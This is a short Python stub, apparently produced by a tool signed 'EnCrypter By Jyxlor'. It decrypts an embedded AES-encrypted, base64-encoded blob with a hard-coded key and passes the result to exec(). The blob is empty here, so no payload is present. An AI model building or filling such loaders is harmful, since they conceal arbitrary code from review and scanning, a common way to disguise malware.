# -*- coding: utf-8 -*-
import base64, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib

ENCRYPTED_CODE = b''
KEY = b'\xca\x97\x81\x12\xca\x1b\xbd\xca\xfa\xc21\xb3\x9a#\xdcM\xa7\x86\xef\xf8\x14|Nr\xb9\x80w\x85\xaf\xeeH\xbb'
IV = b'\x0c\xc1u\xb9\xc0\xf1\xb6\xa81\xc3\x99\xe2iw&a'
try:
    aes_encrypted = base64.b64decode(ENCRYPTED_CODE)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    b64_1 = unpad(cipher.decrypt(aes_encrypted), AES.block_size)
    code = base64.b64decode(b64_1)
    exec(code, globals(), locals())
except Exception as e:
    print(f'[91mEnCrypter By Jyxlor: {e}[0m')
    sys.exit(1)
